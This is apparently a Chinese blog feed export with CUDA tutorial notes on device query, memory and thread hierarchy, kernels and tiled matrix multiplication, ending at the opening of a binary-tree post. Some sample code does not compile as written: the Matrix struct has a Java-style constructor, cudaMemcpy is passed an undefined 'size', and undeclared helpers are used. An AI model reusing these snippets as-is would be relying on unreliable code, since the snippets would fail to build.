<div class="tabs" id="cpp-drive-basic"><ul class="nav-tabs"><li class="tab active"><a href="#cpp-drive-basic-1">Basic</a></li><li class="tab"><a href="#cpp-drive-basic-2">SM</a></li></ul><div class="tab-content"><div class="tab-pane active" id="cpp-drive-basic-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    cudaError_t err = cudaSuccess;</span><br><span class="line">    <span class="type">int</span> device_count;</span><br><span class="line">    err = <span class="built_in">cudaGetDeviceCount</span>(&amp;device_count); <span class="comment">// 获取显卡数量</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> devID = <span class="number">0</span>; <span class="comment">// 显卡ID (&gt;=0)</span></span><br><span class="line">    <span class="type">int</span> computeMode = <span class="number">-1</span>;</span><br><span class="line">    err = <span class="built_in">cudaDeviceGetAttribute</span>(&amp;computeMode, cudaDevAttrComputeMode, devID); <span class="comment">// 获取显卡计算模式</span></span><br><span class="line">    <span class="keyword">if</span> (computeMode == cudaComputeModeProhibited) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: device is running in &lt;Compute Mode Prohibited&gt;, no threads can use cudaSetDevice().\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> major = <span class="number">0</span>, minor = <span class="number">0</span>;</span><br><span class="line">    err = <span class="built_in">cudaDeviceGetAttribute</span>(&amp;major, cudaDevAttrComputeCapabilityMajor, devID); <span class="comment">// 获取显卡SM主版本</span></span><br><span class="line">    err = <span class="built_in">cudaDeviceGetAttribute</span>(&amp;minor, cudaDevAttrComputeCapabilityMinor, devID); <span class="comment">// 获取显卡SM子版本</span></span><br><span class="line">    sm_per_multiproc = _SM2Cores(major,  minor); <span class="comment">// 根据SM版本查表获取每个SM的CUDA核心数（见SM）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> multiProcessorCount = <span class="number">0</span>, clockRate = <span class="number">0</span>;</span><br><span class="line">    err = <span class="built_in">cudaDeviceGetAttribute</span>(&amp;multiProcessorCount, cudaDevAttrMultiProcessorCount, devID); <span class="comment">// 获取显卡SM数量</span></span><br><span class="line">    err = <span class="built_in">cudaDeviceGetAttribute</span>(&amp;clockRate, cudaDevAttrClockRate, devID); <span class="comment">// 获取显卡时钟频率</span></span><br><span class="line">    <span class="type">uint64_t</span> compute_perf = (<span class="type">uint64_t</span>)multiProcessorCount * sm_per_multiproc * clockRate; <span class="comment">// 显卡计算能力 = SM数量 * CUDA核心数/SM * 时钟频率</span></span><br><span class="line"></span><br><span class="line">    err = <span class="built_in">cudaSetDevice</span>(devID); <span class="comment">// 设置用于GPU计算的显卡 (默认ID: 0)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="cpp-drive-basic-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> SM;           <span class="comment">// (0xMm) M = SM Major version, m = SM minor version</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name; <span class="comment">// GPU Architecture name</span></span><br><span class="line">    <span class="type">int</span> cores;        <span class="comment">// CUDA Cores per SM</span></span><br><span class="line">&#125; SMInfo;</span><br><span class="line"></span><br><span class="line">SMInfo smInfos[] = &#123;</span><br><span class="line">    &#123;<span class="number">0x30</span>, <span class="string">&quot;Kepler&quot;</span>, <span class="number">192</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x32</span>, <span class="string">&quot;Kepler&quot;</span>, <span class="number">192</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x35</span>, <span class="string">&quot;Kepler&quot;</span>, <span class="number">192</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x37</span>, <span class="string">&quot;Kepler&quot;</span>, <span class="number">192</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x50</span>, <span class="string">&quot;Maxwell&quot;</span>, <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x52</span>, <span class="string">&quot;Maxwell&quot;</span>, <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x53</span>, <span class="string">&quot;Maxwell&quot;</span>, <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x60</span>, <span class="string">&quot;Pascal&quot;</span>, <span class="number">64</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x61</span>, <span class="string">&quot;Pascal&quot;</span>, <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x62</span>, <span class="string">&quot;Pascal&quot;</span>, <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x70</span>, <span class="string">&quot;Volta&quot;</span>, <span class="number">64</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x72</span>, <span class="string">&quot;Xavier&quot;</span>, <span class="number">64</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x75</span>, <span class="string">&quot;Turing&quot;</span>, <span class="number">64</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x80</span>, <span class="string">&quot;Ampere&quot;</span>, <span class="number">64</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x86</span>, <span class="string">&quot;Ampere&quot;</span>, <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="number">-1</span>, <span class="string">&quot;Graphics Device&quot;</span>, <span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><ul>
<li>DeviceMemory &#x2F; GlobalMemory:<ul>
<li>linear memory: <a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#device-memory">寻址空间大小</a>取决于主机系统和GPU的计算能力<ul>
<li><code>cudaMalloc()</code> 申请</li>
<li><code>cudaFree()</code> 释放</li>
<li><code>cudaMemcpy()</code> 主机内存和设备内存间拷贝</li>
</ul>
</li>
<li>CUDA arrays:</li>
</ul>
</li>
<li>SharedMemory:</li>
<li>Page-lockedHostMemory:</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span></span></span><br><span class="line"><span class="built_in">cudaMemcpy</span>(d_A, h_A, size, cudaMemcpyHostToDevice);</span><br><span class="line"><span class="built_in">cudaMemcpy</span>(h_B, d_B, size, cudaMemcpyDeviceToHost);</span><br></pre></td></tr></table></figure>

<h2 id="计算模型"><a href="#计算模型" class="headerlink" title="计算模型"></a>计算模型</h2><p><a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html">cuda-c-programming-guide</a></p>
<ul>
<li><strong>Kernels</strong>: <code>__global__</code>修饰的c++函数<ul>
<li>内建变量：<ul>
<li><code>gridDim.x/y/z</code> 一个grid中block的数量（各方向）</li>
<li><code>blockDim.x/y/z</code> 一个block中thread的数量（各方向）</li>
<li><code>blockIdx.x/y/z</code> 一个grid中的block索引（各方向从0开始）</li>
<li><code>threadIdx.x/y/z</code> 一个block中的thread索引（各方向从0开始）</li>
<li><code>gridDim.x * blockDim.x</code> 一个grid中线程的数量（x方向）</li>
</ul>
</li>
<li>调用语法：<code>&lt;&lt;&lt;blocksPreGrid, threadPreBlock&gt;&gt;&gt;</code></li>
</ul>
</li>
<li><strong>ThreadHierarchy</strong>: grid -&gt; block -&gt; thread，各层级均有三个维度 (x, y, z)<ul>
<li>三个维度分别用于<code>vector, matrix, volume</code>的计算<ul>
<li>一维<code>I(x)</code>：<code>ThreadID = I.x</code></li>
<li>二维<code>I(x,y)</code>：<code>ThreadID = I.x + I.y * D.x</code></li>
<li>三维<code>I(x,y,z)</code>：<code>ThreadID = I.x + I.y * D.x + I.z * D.x * D.y</code></li>
</ul>
</li>
<li>每个block是独立执行的：可以并行（in parallel），也可以串行（in series）</li>
<li>一个block上的所有thread限制在同一块显卡上分配核心且共享显存，因此thread数量（&lt;&#x3D;1024）是有限的</li>
<li>一个block上的所有thread之间通过<a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#shared-memory">SharedMemory</a>共享数据，并通过<a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#cooperative-groups">Cooperative Groups API</a>协调内存访问<ul>
<li><code>__syncthreads()</code>等待一个block内的所有thread都执行到此位置后，才允许继续执行（barrier同步）</li>
</ul>
</li>
</ul>
</li>
<li><strong>MemoryHierarchy</strong>:<ul>
<li><a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#device-memory-accesses">GlobalMemorySpace</a><ul>
<li>global memory - access by grid0, grid1, …</li>
<li>per-block shared memory</li>
<li>per-thread local memory</li>
</ul>
</li>
<li>ConstantMemorySpace</li>
<li><a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#texture-and-surface-memory">TextureMemorySpace</a></li>
</ul>
</li>
<li><strong>HeterogeneousProgramming</strong>:<ul>
<li>cuda线程在协处理器（coprocessor）上运行，即c++程序中kernals并行跑在gpu上时，其余串行部分同时跑在cpu上</li>
<li>cpu和gpu分别跑在各自独立的内存空间中，并通过<a href="https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#um-unified-memory-programming-hd">Unified Memory</a>桥接它们</li>
</ul>
</li>
</ul>
<div class="tabs" id="kernel"><ul class="nav-tabs"><li class="tab active"><a href="#kernel-1">KernelPrint</a></li><li class="tab"><a href="#kernel-2">VectorAdd</a></li><li class="tab"><a href="#kernel-3">MatrixAdd</a></li><li class="tab"><a href="#kernel-4">MatrixAdd-multiBlock</a></li></ul><div class="tab-content"><div class="tab-pane active" id="kernel-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">testKernel</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> blockId = blockIdx.y * gridDim.x + blockIdx.x;</span><br><span class="line">    <span class="type">int</span> threadId = threadIdx.z * blockDim.x * blockDim.y + threadIdx.y * blockDim.x + threadIdx.x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%d, %d]: %d\n&quot;</span>, blockId, threadId, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// two-dimensional grid and three-dimensional blocks</span></span><br><span class="line">  <span class="function">dim3 <span class="title">dimGrid</span><span class="params">(<span class="number">2</span>, <span class="number">2</span>)</span></span>;</span><br><span class="line">  <span class="function">dim3 <span class="title">dimBlock</span><span class="params">(<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">  testKernel&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[1, 0]: 10</span></span><br><span class="line"><span class="comment">[1, 1]: 10</span></span><br><span class="line"><span class="comment">[1, 2]: 10</span></span><br><span class="line"><span class="comment">[1, 3]: 10</span></span><br><span class="line"><span class="comment">[1, 4]: 10</span></span><br><span class="line"><span class="comment">[1, 5]: 10</span></span><br><span class="line"><span class="comment">[2, 0]: 10</span></span><br><span class="line"><span class="comment">[2, 1]: 10</span></span><br><span class="line"><span class="comment">[2, 2]: 10</span></span><br><span class="line"><span class="comment">[2, 3]: 10</span></span><br><span class="line"><span class="comment">[2, 4]: 10</span></span><br><span class="line"><span class="comment">[2, 5]: 10</span></span><br><span class="line"><span class="comment">[0, 0]: 10</span></span><br><span class="line"><span class="comment">[0, 1]: 10</span></span><br><span class="line"><span class="comment">[0, 2]: 10</span></span><br><span class="line"><span class="comment">[0, 3]: 10</span></span><br><span class="line"><span class="comment">[0, 4]: 10</span></span><br><span class="line"><span class="comment">[0, 5]: 10</span></span><br><span class="line"><span class="comment">[3, 0]: 10</span></span><br><span class="line"><span class="comment">[3, 1]: 10</span></span><br><span class="line"><span class="comment">[3, 2]: 10</span></span><br><span class="line"><span class="comment">[3, 3]: 10</span></span><br><span class="line"><span class="comment">[3, 4]: 10</span></span><br><span class="line"><span class="comment">[3, 5]: 10</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="kernel-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Kernel definition</span></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">VecAdd</span><span class="params">(<span class="type">float</span>* A, <span class="type">float</span>* B, <span class="type">float</span>* C)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = threadIdx.x;</span><br><span class="line">    C[i] = A[i] + B[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Kernel invocation with N threads in 1 block</span></span><br><span class="line">    VecAdd&lt;&lt;&lt;<span class="number">1</span>, N&gt;&gt;&gt;(A, B, C);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="kernel-3"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Kernel definition</span></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatAdd</span><span class="params">(<span class="type">float</span> A[N][N], <span class="type">float</span> B[N][N], <span class="type">float</span> C[N][N])</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> j = threadIdx.y;</span><br><span class="line">    C[i][j] = A[i][j] + B[i][j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Kernel invocation with one block of N * N * 1 threads</span></span><br><span class="line">    <span class="type">int</span> numBlocks = <span class="number">1</span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">threadsPerBlock</span><span class="params">(N, N)</span></span>;</span><br><span class="line">    MatAdd&lt;&lt;&lt;numBlocks, threadsPerBlock&gt;&gt;&gt;(A, B, C);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="kernel-4"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Kernel definition</span></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatAdd</span><span class="params">(<span class="type">float</span> A[N][N], <span class="type">float</span> B[N][N], <span class="type">float</span> C[N][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line">    <span class="type">int</span> j = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; N &amp;&amp; j &lt; N)</span><br><span class="line">        C[i][j] = A[i][j] + B[i][j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Kernel invocation with 16x16=256 threads pre block</span></span><br><span class="line">    <span class="function">dim3 <span class="title">threadsPerBlock</span><span class="params">(<span class="number">16</span>, <span class="number">16</span>)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">numBlocks</span><span class="params">(N / threadsPerBlock.x, N / threadsPerBlock.y)</span></span>;</span><br><span class="line">    MatAdd&lt;&lt;&lt;numBlocks, threadsPerBlock&gt;&gt;&gt;(A, B, C);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<p><a href="https://github.com/imssyang/cuda/tree/master/sample/vector_add">sample_vector_add (cpu vs gpu)</a></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h3><p><a href="https://github.com/imssyang/cuda/tree/master/sample/vector_mul">sample_vector_mul</a></p>
<div class="tabs" id="matrixmultiplication"><ul class="nav-tabs"><li class="tab active"><a href="#matrixmultiplication-1">GlobalMemory</a></li><li class="tab"><a href="#matrixmultiplication-2">SharedMemory</a></li></ul><div class="tab-content"><div class="tab-pane active" id="matrixmultiplication-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C[B.width, A.height] = B[width, height] * A[width, height]，且A.width == B.height</span></span><br><span class="line"><span class="comment">// C[列维度]：将B.width均分成blockDim.x个块，块索引为blockIdx.x，块中的列索引为threadIdx.x</span></span><br><span class="line"><span class="comment">// C[行维度]：将A.height均分成blockDim.y个块，块索引为blockIdx.y，块中的行索引为threadIdx.y</span></span><br><span class="line"><span class="comment">// C[一个元素] = B[一列元素] * A[一行元素]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCK_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Matrix</span> &#123;</span><br><span class="line">    <span class="type">int</span> width;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="type">float</span>* elements;</span><br><span class="line">    <span class="built_in">Matrix</span>(width, height) &#123; <span class="keyword">this</span>.width = width; <span class="keyword">this</span>.height = height; &#125;</span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> width * height * <span class="built_in">sizeof</span>(<span class="type">float</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatMulKernel</span><span class="params">(Matrix A, Matrix B, Matrix C)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> col = blockIdx.x * blockDim.x + threadIdx.x; <span class="comment">// &lt; B.width</span></span><br><span class="line">    <span class="type">int</span> row = blockIdx.y * blockDim.y + threadIdx.y; <span class="comment">// &lt; A.height</span></span><br><span class="line">    <span class="type">float</span> Cvalue = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> e = <span class="number">0</span>; e &lt; A.width; ++e) <span class="comment">// A.width == B.height</span></span><br><span class="line">        Cvalue += B.elements[e * B.width + col]</span><br><span class="line">                * A.elements[row * A.width + e];</span><br><span class="line">    C.elements[row * C.width + col] = Cvalue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// eg: C[2,2] = B[2,3] * A[3,2]</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MatMul</span><span class="params">(<span class="type">const</span> Matrix A, <span class="type">const</span> Matrix B, Matrix C)</span> </span>&#123;</span><br><span class="line">    <span class="function">Matrix <span class="title">d_A</span><span class="params">(A.width, A.height)</span></span>;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;d_A.elements, d_A.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(d_A.elements, A.elements, d_A.<span class="built_in">size</span>(), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">Matrix <span class="title">d_B</span><span class="params">(B.width, B.height)</span></span>;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;d_B.elements, d_B.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(d_B.elements, B.elements, d_B.<span class="built_in">size</span>(), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">Matrix <span class="title">d_C</span><span class="params">(B.width, A.height)</span></span>;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;d_C.elements, d_C.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">dimBlock</span><span class="params">(BLOCK_SIZE, BLOCK_SIZE)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">dimGrid</span><span class="params">(B.width / dimBlock.x, A.height / dimBlock.y)</span></span>;</span><br><span class="line">    MatMulKernel&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(d_A, d_B, d_C);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(C.elements, d_C.elements, size, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(d_A.elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(d_B.elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(d_C.elements);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="matrixmultiplication-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C[B.width, A.height] = B[width, height] * A[width, height]，且A.width == B.height</span></span><br><span class="line"><span class="comment">// C[列维度]：将B.width均分成块，块的列索引为blockIdx.x，块中元素的列索引为threadIdx.x</span></span><br><span class="line"><span class="comment">// C[行维度]：将A.height均分成块，块的行索引为blockIdx.y，块中元素的行索引为threadIdx.y</span></span><br><span class="line"><span class="comment">// C[块中一个元素] = B[所有块的每一列元素] * A[所有块的每一行元素]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCK_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Matrix</span> &#123;</span><br><span class="line">    <span class="type">int</span> width;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="type">int</span> stride;</span><br><span class="line">    <span class="type">float</span>* elements;</span><br><span class="line">    <span class="built_in">Matrix</span>(width, height, stride) &#123; <span class="keyword">this</span>.width = width; <span class="keyword">this</span>.height = height; <span class="keyword">this</span>.stride = stride; &#125;</span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> width * height * <span class="built_in">sizeof</span>(<span class="type">float</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ Matrix <span class="title">GetSubMatrix</span><span class="params">(Matrix M, <span class="type">int</span> blockRow, <span class="type">int</span> blockCol)</span> </span>&#123;</span><br><span class="line">    Matrix Msub;</span><br><span class="line">    Msub.width    = BLOCK_SIZE;</span><br><span class="line">    Msub.height   = BLOCK_SIZE;</span><br><span class="line">    Msub.stride   = M.stride;</span><br><span class="line">    Msub.elements = &amp;M.elements[M.stride * BLOCK_SIZE * blockRow + BLOCK_SIZE * blockCol]; <span class="comment">// from upper-left corner of M</span></span><br><span class="line">    <span class="keyword">return</span> Msub;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">MatMulKernel</span><span class="params">(Matrix A, Matrix B, Matrix C)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> blockCol = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> blockRow = blockIdx.y;</span><br><span class="line">    <span class="type">int</span> col = threadIdx.x; <span class="comment">// &lt; BLOCK_SIZE</span></span><br><span class="line">    <span class="type">int</span> row = threadIdx.y; <span class="comment">// &lt; BLOCK_SIZE</span></span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> Cvalue = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; (A.width / BLOCK_SIZE); ++m) &#123; <span class="comment">// A.width == B.height</span></span><br><span class="line">        __shared__ <span class="type">float</span> As[BLOCK_SIZE][BLOCK_SIZE]; <span class="comment">// shared memory</span></span><br><span class="line">        __shared__ <span class="type">float</span> Bs[BLOCK_SIZE][BLOCK_SIZE]; <span class="comment">// shared memory</span></span><br><span class="line"></span><br><span class="line">        Matrix Asub = <span class="built_in">GetSubMatrix</span>(A, blockRow, m);</span><br><span class="line">        Matrix Bsub = <span class="built_in">GetSubMatrix</span>(B, m, blockCol);</span><br><span class="line">        As[row][col] = Asub.elements[row * Asub.stride + col]; <span class="comment">// one thread copies one element from global memory to shared memory</span></span><br><span class="line">        Bs[row][col] = Bsub.elements[row * Bsub.stride + col]; <span class="comment">// one thread copies one element from global memory to shared memory</span></span><br><span class="line"></span><br><span class="line">        __syncthreads(); <span class="comment">// Synchronize to make sure the sub-matrices are loaded before starting the computation</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> e = <span class="number">0</span>; e &lt; BLOCK_SIZE; ++e)</span><br><span class="line">            Cvalue += As[row][e] * Bs[e][col];</span><br><span class="line"></span><br><span class="line">        __syncthreads(); <span class="comment">// Synchronize to make sure that the preceding computation is done</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Matrix Csub = <span class="built_in">GetSubMatrix</span>(C, blockRow, blockCol);</span><br><span class="line">    Csub.elements[row * Csub.stride + col] = Cvalue; <span class="comment">// result to global memory</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// eg: C[2,2] = B[2,3] * A[3,2]</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MatMul</span><span class="params">(<span class="type">const</span> Matrix A, <span class="type">const</span> Matrix B, Matrix C)</span> </span>&#123;</span><br><span class="line">    <span class="function">Matrix <span class="title">d_A</span><span class="params">(A.width, A.height, A.width)</span></span>;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;d_A.elements, d_A.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(d_A.elements, A.elements, d_A.<span class="built_in">size</span>(), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">Matrix <span class="title">d_B</span><span class="params">(B.width, B.height, B.width)</span></span>;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;d_B.elements, d_B.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(d_B.elements, B.elements, d_B.<span class="built_in">size</span>(), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">Matrix <span class="title">d_C</span><span class="params">(B.width, A.height, B.width)</span></span>;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;d_C.elements, d_C.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">dimBlock</span><span class="params">(BLOCK_SIZE, BLOCK_SIZE)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">dimGrid</span><span class="params">(B.width / dimBlock.x, A.height / dimBlock.y)</span></span>;</span><br><span class="line">    MatMulKernel&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(d_A, d_B, d_C);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(C.elements, d_C.elements, size, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(d_A.elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(d_B.elements);</span><br><span class="line">    <span class="built_in">cudaFree</span>(d_C.elements);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>
]]></content>
      <categories>
        <category>CUDA</category>
      </categories>
      <tags>
        <tag>cuda</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树</title>
    <url>/DataStructure/BinarySearchTree/BinarySearchTree.html</url>
    <content><![CDATA[<p>二叉树的基础概念和类型说明，以及二叉搜索树相关的算法。</p>
<span id="more"></span>

<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><ul>
<li>节点<ul>
<li>根节点（<code>root</code>）：没有父节点。</li>
<li>父节点（<code>parent</code>）：有子节点。</li>
<li>子节点（<code>child</code>）：有父节点。</li>
<li>叶节点（<code>leaf</code>）：没有子节点。</li>
<li>兄弟节点（<code>sibling</code>）：具有相同的父节点。</li>
</ul>
</li>
<li>类型<ul>
<li>有根二叉树（<code>rooted</code>）：有<code>1</code>个根节点且每个节点最多有<code>2</code>个子节点。</li>
<li>满二叉树（<code>full</code>）：每个节点都有<code>0</code>或<code>2</code>个子节点。</li>
<li>完全二叉树（<code>complete</code>）：除最后一层外的其他层都是完全填充的，最后一层的所有节点都靠左。</li>
<li>完美二叉树（<code>perfect</code>）：所有内部节点都有<code>2</code>个子节点，所有叶子节点都有相同的深度。</li>
